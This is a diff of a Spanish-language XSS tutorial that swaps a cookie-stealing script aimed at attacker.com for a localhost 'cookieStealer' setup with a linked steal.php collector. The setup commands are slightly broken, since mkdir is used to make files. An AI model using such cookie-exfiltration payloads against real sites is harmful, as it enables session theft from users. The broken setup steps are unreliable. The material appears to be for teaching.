@@ -74,7 +74,17 @@ Podríamos redirigir a una página de phishing:
 
 Podemos capturar cookies del usuario (en ataques reales):
 
-`<script>document.write('<img src="http://attacker.com/steal.php?cookie='+document.cookie+'">')</script>`
+Crea en tu servidor web una carpeta con nombre cookieStealer y copias en el archivo index.php [este archivo php](files/steal.php)
+
+~~~
+mkdir /var/www/html/cookieStealer/
+mkdir /var/www/html/cookieStealer/index.php
+mkdir /var/www/html/cookieStealer/cookies.txt
+chmod 777 /var/www/html/cookieStealer/cookies.txt
+
+~~~
+
+`<script>document.write('<img src="http://localhost/cookieStealer/index.php?cookie='+document.cookie+'">')</script>`
 
 Con esto, un atacante podría robar sesiones de usuarios.
 
